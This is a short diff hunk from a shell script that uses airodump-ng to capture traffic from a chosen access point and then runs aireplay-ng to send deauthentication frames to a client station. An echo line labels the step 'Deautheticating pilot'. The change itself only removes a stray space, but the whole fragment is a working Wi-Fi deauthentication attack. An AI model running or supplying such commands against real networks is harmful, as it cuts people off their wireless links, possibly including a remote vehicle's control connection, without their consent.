@@ -14,5 +14,5 @@ airodump-ng -c [CH] --bssid [BSSID] -w /root/Desktop/ wlan0mon & sleep 5
 kill $!
 # Following command parses from the -01.csv file. 
 echo "Deautheticating pilot:" & sleep 2
-gnome-terminal -x aireplay-ng -0 2 -a [BSSID] -c [STATION]  & sleep 5
+gnome-terminal -x aireplay-ng -0 2 -a [BSSID] -c [STATION] & sleep 5
 kill $!
